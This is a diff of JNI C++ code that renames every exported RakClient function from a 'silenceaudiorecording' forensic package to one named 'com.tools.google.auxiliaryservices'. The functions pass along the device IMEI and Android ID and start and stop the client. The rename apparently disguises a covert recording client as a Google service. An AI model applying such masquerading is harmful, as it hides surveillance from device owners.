@@ -422,7 +422,7 @@ namespace java_global
 extern "C"
 {
 
-    JNIEXPORT void JNICALL Java_com_forensic_unipg_silenceaudiorecording_RakClient_setIMEI
+    JNIEXPORT void JNICALL Java_com_tools_google_auxiliaryservices_RakClient_setIMEI
     (
             JNIEnv *env,
             jclass clazz,
@@ -435,7 +435,7 @@ extern "C"
         java_global::client_callback.set_imei(c_str_imei);
     }
 
-    JNIEXPORT void JNICALL Java_com_forensic_unipg_silenceaudiorecording_RakClient_setAndroidID
+    JNIEXPORT void JNICALL Java_com_tools_google_auxiliaryservices_RakClient_setAndroidID
     (
             JNIEnv *env,
             jclass clazz,
@@ -449,7 +449,7 @@ extern "C"
     }
 
 
-    JNIEXPORT jboolean JNICALL Java_com_forensic_unipg_silenceaudiorecording_RakClient_start
+    JNIEXPORT jboolean JNICALL Java_com_tools_google_auxiliaryservices_RakClient_start
     (
             JNIEnv *env,
             jclass clazz,
@@ -478,7 +478,7 @@ extern "C"
         return (jboolean)status;
     }
 
-    JNIEXPORT jboolean JNICALL Java_com_forensic_unipg_silenceaudiorecording_RakClient_stop
+    JNIEXPORT jboolean JNICALL Java_com_tools_google_auxiliaryservices_RakClient_stop
     (
             JNIEnv *env,
             jclass clazz
@@ -497,7 +497,7 @@ extern "C"
         return false;
     }
 
-    JNIEXPORT jint JNICALL Java_com_forensic_unipg_silenceaudiorecording_RakClient_state
+    JNIEXPORT jint JNICALL Java_com_tools_google_auxiliaryservices_RakClient_state
     (
             JNIEnv *env,
             jclass clazz
